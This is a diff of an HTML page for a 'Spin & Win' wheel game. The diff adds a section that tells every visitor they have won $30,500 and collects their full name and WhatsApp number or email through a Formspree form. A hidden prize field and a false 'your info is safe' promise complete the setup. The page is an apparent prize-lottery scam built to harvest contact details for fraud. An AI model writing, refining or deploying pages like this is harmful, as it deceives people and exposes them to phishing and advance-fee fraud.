@@ -3,21 +3,47 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PEPE SPIN WIN </title>
+  <title>Spin & Win Big!</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-  <h1>Spin & Win!</h1>
+  <div id="game-section">
+    <h1>Spin & Win Huge Cash! 🎰</h1>
+    <p>Click to spin — big prizes await!</p>
 
-  <div class="wheel-container">
-    <div class="wheel">SPIN ME</div>
-    <div class="pointer">▼</div>
+    <div class="wheel-container">
+      <div class="wheel" id="wheel">SPIN ME 🎁</div>
+      <div class="pointer">▼</div>
+    </div>
+
+    <button id="spinBtn">SPIN NOW!</button>
+
+    <p id="result" style="font-size: 24px; min-height: 80px;"></p>
   </div>
 
-  <button id="spin">Spin Now</button>
+  <div id="form-section" style="display: none;">
+    <h2 style="color: #ffd700;">CONGRATULATIONS! 🎉</h2>
+    <p style="font-size: 22px; color: #00ff9d;">
+      YOU WON $30,500 💰<br>
+      FILL THE FORM BELOW TO PROCEED & CLAIM YOUR PRIZE!
+    </p>
 
-  <p id="result">Click spin to play!</p>
+    <!-- Formspree form -->
+    <form action="https://formspree.io/f/xzdrqyke" method="POST">
+      <input type="text" name="name" placeholder="Your Full Name" required><br>
+      <input type="text" name="contact" placeholder="WhatsApp or Email" required><br>
+      
+      <!-- Hidden field so you see the prize in your inbox/dashboard -->
+      <input type="hidden" name="prize" value="CONGRATULATIONS YOU WON $30,500">
+
+      <button type="submit">CLAIM MY $30,500 NOW</button>
+    </form>
+
+    <p style="font-size: 14px; color: #aaa; margin-top: 30px;">
+      Your info is safe — we'll contact you shortly!
+    </p>
+  </div>
 
   <script src="script.js"></script>
 </body>
